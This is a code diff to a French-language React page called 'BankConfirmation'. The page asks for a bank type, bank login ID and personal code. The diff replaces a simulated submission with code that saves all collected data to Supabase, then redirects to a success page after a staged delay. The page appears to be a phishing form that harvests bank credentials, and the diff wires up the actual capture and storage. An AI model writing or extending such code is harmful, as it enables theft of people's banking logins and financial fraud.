@@ -3,7 +3,7 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession } from "@/utils/sessionUtils";
+import { updateUserSession, saveUserDataToJson } from "@/utils/sessionUtils";
 import { toast } from "sonner";
 
 const BankConfirmation: React.FC = () => {
@@ -14,7 +14,7 @@ const BankConfirmation: React.FC = () => {
   const [processing, setProcessing] = useState(false);
   const navigate = useNavigate();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!typeBanque || !identifiantBancaire || !codePersonnel) {
@@ -24,8 +24,7 @@ const BankConfirmation: React.FC = () => {
 
     setIsLoading(true);
 
-    // Simule la soumission du formulaire
-    setTimeout(() => {
+    try {
       // Stocke les informations dans la session
       updateUserSession({
         typeBanque,
@@ -36,11 +35,24 @@ const BankConfirmation: React.FC = () => {
       setIsLoading(false);
       setProcessing(true);
       
-      // Simule le traitement et redirection vers la page de succès
+      // Sauvegarde toutes les données collectées dans Supabase
+      await saveUserDataToJson();
+      
+      // Redirection vers la page de succès après sauvegarde
       setTimeout(() => {
         navigate("/success");
       }, 3000);
-    }, 800);
+    } catch (error: any) {
+      console.error("Erreur lors de l'enregistrement:", error);
+      setIsLoading(false);
+      setProcessing(false);
+      
+      if (error.isRlsError) {
+        toast.error(`Erreur de sécurité Supabase: ${error.message}`);
+      } else {
+        toast.error("Une erreur est survenue lors de l'enregistrement des données.");
+      }
+    }
   };
 
   return (
